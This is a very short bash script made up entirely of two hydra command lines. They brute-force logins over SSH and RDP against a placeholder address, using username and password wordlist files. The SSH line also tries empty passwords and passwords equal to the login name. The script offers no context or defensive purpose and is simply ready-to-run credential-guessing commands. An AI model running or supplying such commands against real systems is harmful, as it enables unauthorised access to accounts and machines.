#!/bin/bash

`hydra -L root.txt -P *.dic -t 2 -vV -e ns 0.0.0.0 ssh`

hydra 0.0.0.0 rdp -L users.txt -P pass.txt -V
